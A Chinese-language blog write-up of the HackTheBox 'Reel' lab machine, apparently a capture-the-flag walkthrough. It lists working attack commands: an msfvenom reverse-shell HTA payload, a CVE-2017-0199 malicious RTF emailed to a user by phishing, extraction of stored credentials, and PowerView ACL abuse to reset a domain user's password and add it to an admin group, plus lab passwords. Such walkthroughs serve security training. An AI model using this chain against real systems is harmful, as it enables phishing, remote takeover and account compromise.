---
title: "HTB Reel"
description: "HackTheBox篇Active Directory 101系列之Reel"

date: 2024-10-27T13:34:07+08:00
lastmod: 2025-11-11T14:12:02+08:00

math: true
mermaid: true

categories:
  - HackTheBox
tags:
  - Windows
  - RTF Phishing
  - ACL abuse
---
<!--more-->

> 靶机ip：10.10.10.77

# 知识点

* RTF钓鱼
* ACL滥用-user-WriteOwner权限
* ACL滥用-group-WriteDacl权限

# 信息收集

## nmap扫描

```bash
nmap --min-rate 10000 -A -sV -sC -p- 10.10.10.77
```

```nmap
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-27 13:44 CST
Nmap scan report for 10.10.10.77
Host is up (0.76s latency).
Not shown: 65527 filtered tcp ports (no-response)
PORT      STATE SERVICE      VERSION
21/tcp    open  ftp          Microsoft ftpd
| ftp-syst:
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_05-28-18  11:19PM       <DIR>          documents
22/tcp    open  ssh          OpenSSH 7.6 (protocol 2.0)
| ssh-hostkey:
|   2048 82:20:c3:bd:16:cb:a2:9c:88:87:1d:6c:15:59:ed:ed (RSA)
|   256 23:2b:b8:0a:8c:1c:f4:4d:8d:7e:5e:64:58:80:33:45 (ECDSA)
|_  256 ac:8b:de:25:1d:b7:d8:38:38:9b:9c:16:bf:f6:3f:ed (ED25519)
25/tcp    open  smtp?
| smtp-commands: REEL, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, X11Probe:
|     220 Mail Service ready
|   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest:
|     220 Mail Service ready
|     sequence of commands
|     sequence of commands
|   Hello:
|     220 Mail Service ready
|     EHLO Invalid domain address.
|   Help:
|     220 Mail Service ready
|     DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
|   SIPOptions:
|     220 Mail Service ready
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|   TerminalServerCookie:
|     220 Mail Service ready
|_    sequence of commands
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows Server 2012 R2 Standard 9600 microsoft-ds (workgroup: HTB)
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49159/tcp open  msrpc        Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
...
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: specialized
Running (JUST GUESSING): Microsoft Windows 7 (85%)
OS CPE: cpe:/o:microsoft:windows_7
Aggressive OS guesses: Microsoft Windows Embedded Standard 7 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: REEL; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery:
|   OS: Windows Server 2012 R2 Standard 9600 (Windows Server 2012 R2 Standard 6.3)
|   OS CPE: cpe:/o:microsoft:windows_server_2012::-
|   Computer name: REEL
|   NetBIOS computer name: REEL\x00
|   Domain name: HTB.LOCAL
|   Forest name: HTB.LOCAL
|   FQDN: REEL.HTB.LOCAL
|_  System time: 2024-10-27T05:48:32+00:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-time:
|   date: 2024-10-27T05:48:28
|_  start_date: 2024-10-27T05:35:31
| smb2-security-mode:
|   3:0:2:
|_    Message signing enabled and required
|_clock-skew: mean: 2s, deviation: 3s, median: 0s

TRACEROUTE (using port 445/tcp)
HOP RTT       ADDRESS
1   644.73 ms 10.10.16.1
2   961.24 ms 10.10.10.77

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 263.65 seconds
```

开放21，22，25等若干端口，同时通过脚本扫描结果可知，该域名是`REEL.HTB.LOCAL`和`HTB.LOCAL`，将其添加到`/etc/hosts`文件中

![image-20241027135319436](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241027135321701-294670808.png)

## FTP

从扫描结果可知，ftp是允许匿名登录的

```bash
ftp anonymous@10.10.10.77
```

![image-20241027135528981](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241027135531142-1779717189.png)

发现三个文件，全部下载下来

```bash
prompt off
mget *
```

![image-20241027135721726](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241027135724047-432466087.png)

全部查看一下

* readme.txt

![image-20241027135937958](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241027135939835-2118791.png)

发现是要使用邮件发送rtf格式的文件，并且文档都会保存到这里

* AppLocker.docx

![image-20241027140115107](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241027140116875-11898502.png)

* Windows Event Forwarding.docx

![image-20241027140533430](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241027140535714-592406716.png)

打开后发现文件已经损坏，使用`exiftool `检查数据

```bash
exiftool Windows\ Event\ Forwarding.docx
```

![image-20241027140724359](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241027140726612-828137712.png)

找到了个邮箱`nico@megabank.com`

# RTF钓鱼

漏洞链接：[CVE-2017-0199](https://nvd.nist.gov/vuln/detail/CVE-2017-0199)

使用`msfvenom`生成一个HTA文件

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.4 LPORT=8888 -f hta-psh -o shell.hta
```

![image-20241027142446919](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241027142449226-1612502237.png)

使用[CVE-2017-0199](https://github.com/bhdresh/CVE-2017-0199)中的脚本创建一个RTF文件

```bash
python2 CVE-2017-0199/cve-2017-0199_toolkit.py -M gen -w shell.rtf -u http://10.10.16.4/shell.hta -t rtf -x 0
```

![image-20241027142909573](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241027142911589-1627462942.png)

先启动一个http服务，在准备一个nc监听

![image-20241027143031493](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241027143033400-71778760.png)

![image-20241027143039426](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241027143041473-540171105.png)

使用`sendemail `发送邮件

```bash
sendEmail -f root@admin.com -t nico@megabank.com -u "look me" -m "click me" -a shell.rtf -s 10.10.10.77 -v
```

![image-20241027143936622](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241027143939282-234032504.png)

大约等待30s左右，就获得到shell了

![image-20241027144229331](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241027144231417-1596098132.png)

找到`user.txt`

# nico -> Tom

在`nico`桌面上发现还有个`cred.xml`，查看一下

![image-20241027144604507](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241027144606786-1891749689.png)

发现是`tom`的用户名和密码

可以使用`Powershell`的`PSCredential`，它提供了一种存储用户名、密码和凭据的方法。还有两个函数`Import-CliXml`和`Export-CliXml` ，用于将这些凭据保存到文件中以及从文件中恢复它们。

使用`Import-CliXml`加载文件来获取明文密码

```bash
powershell -c "$cred = Import-CliXml -Path cred.xml; $cred.GetNetworkCredential() | Format-List *"
```

![image-20241027145026052](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241027145028630-177734907.png)

获取到`Tom`用户的明文密码`1ts-mag1c!!!`

尝试使用ssh登录

```bash
ssh tom@10.10.10.77
```

![image-20241027145335727](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241027145337858-1210501876.png)

# AD Privesc 

![image-20241027145615560](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241027145617853-1021058284.png)

注意到桌面上有个`AD Audit`目录

![image-20241027145703246](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241027145705349-1312903517.png)

先查看一下`note.txt`

![image-20241027145802362](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241027145804355-665684367.png)

查看一下其他文件

![image-20241027150319779](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241027150322032-1642287028.png)

结合提示并实践后发现，运行不了`SharpHound.exe`，无法使用`Bloodhound`进行信息收集，所以我们目标放在`acls.csv`上

使用`scp`将文件下载下来

```bash
scp Tom@10.10.10.77:'/Users/tom/Desktop/AD Audit/BloodHound/Ingestors/acls.csv' ./
```

![image-20241027150855646](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241027150858200-1795280760.png)

![image-20241027151054397](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241027151056577-147523502.png)

是一个`ACL`的文件，分析一下，先对`PrincipalName`简单筛选一下`Tom`

![image-20241027151302192](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241027151304099-1184542152.png)

发现`Tom`对`claire`有`WriteOwner`权限，在搜索一下`claire`

![image-20241027151756078](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241027151757888-1784963385.png)

发现`claire`对`Backup_Admins`组有`WriteDacl`权限

# Tom->claire

注意到之前在`tom`机器上有`PowerView.ps1`

所以我们使用`WriteOwner`权限和`PowerView.ps1`的功能来登录`claire`

需要执行以下步骤：

* 成为`claire`的ACL的所有者
* 获取该ACL权限
* 使用权限更改密码

先导入`PowerView.ps1`

```powershell
. .\PowerView.ps1
```

![image-20241027152935704](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241027152937745-1565451432.png)

先把`Tom`设置成为`claire`的ACL的所有者

```powershell
Set-DomainObjectOwner -identity claire -OwnerIdentity tom
```

给予`Tom`更改ACL上密码的权限

```powershell
Add-DomainObjectAcl -TargetIdentity claire -PrincipalIdentity tom -Rights ResetPassword
```

最后创建一个密码，然后给`claire`

```powershell
$pass = ConvertTo-SecureString "Aa123456!" -AsPlainText -force
Set-DomainUserPassword -identity claire -accountpassword $pass
```

![image-20241027154431882](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241027154433915-1759841619.png)

然后就可以通过ssh登录`claire`用户

![image-20241027154517959](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241027154519928-224576146.png)

# claire->Backup_Admins

之前的ACL分析可知`claire`对`Backup_Admins`组有`WriteDacl`权限，可以用它将`claire`加入该组

先查看一下`Backup_Admins`组

```cmd
net group backup_admins
```

![image-20241027155026424](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241027155028571-432531593.png)

当前用户只有`ranj`

现在添加`claire`

```cmd
net group backup_admins claire /add
```

![image-20241027155113754](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241027155115663-1003890863.png)

再查看一下`Backup_Admins`组

```cmd
net group backup_admins
```

![image-20241027155141343](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241027155143258-1109182793.png)

发现已经`claire`在`Backup_Admins`组中了，重新登录使其生效

**ps: 重新登陆没有成功的，需要在执行一遍 Tom->claire 的操作**

# Backup_Admins->Administrator

目前我们以`claire`身份登录，并是`Backup_Admins`组的成员

说明我们有查看`Administrator`文件的权限

![image-20241027160442280](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241027160444426-963998426.png)

找到`root.txt`，但是我们没权限查看，注意到有个`Backuo Scripts`目录，查看一下

![image-20241027160630997](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241027160633334-1179167874.png)

![image-20241027160741004](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241027160743097-1088951995.png)

最后在`BackupScript.ps1`文件中找到`Admin`的密码`Cr4ckMeIfYouC4n!`

ssh登录

```bash
ssh Administrator@10.10.10.77
```

![image-20241027161033587](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241027161035554-273633219.png)

![image-20241027161106839](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241027161109110-316346945.png)

最终找到`root.txt`